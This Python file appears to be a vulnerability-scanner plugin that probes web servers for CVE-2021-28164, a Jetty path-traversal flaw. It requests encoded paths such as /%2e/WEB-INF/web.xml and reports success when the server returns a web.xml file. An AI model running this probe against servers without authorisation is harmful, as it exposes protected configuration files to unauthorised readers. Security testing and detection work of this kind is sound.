#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from thirdparty import requests

def cve_2021_28164_scan(self, url):
    ''' 默认允许请求的url中包含%2e或者%2e%2e以访问 WEB-INF 目录中的受保护资源
        例如请求 /context/%2e/WEB-INF/web.xml可以检索 web.xml 文件
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'DSinfo'
    vul_info['vul_id'] = 'CVE-2021-28164'
    vul_info['vul_method'] = 'GET'

    for payload in self.cve_2021_28164_payloads:
        path = payload['path']
        target = url + path

        vul_info['path'] = path
        vul_info['target'] = target

        try:
            req = requests.Request(
                method='GET',
                url=target,
                headers=self.headers
            ).prepare()

            req.url = target
            session = requests.session()

            res = session.send(
                req,
                timeout=self.timeout,
                proxies=self.proxies,
                verify=False,
                allow_redirects=False
            )

            logger.logging(vul_info, res.status_code, res)                        # * LOG

            if (('<web-app>' in res.text)
                and ('<display-name>' in res.text)
                and ('<!DOCTYPE web-app PUBLIC' in res.text)
                and ('Sun Microsystems' in res.text)
                and ('DTD Web Application' in res.text)
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
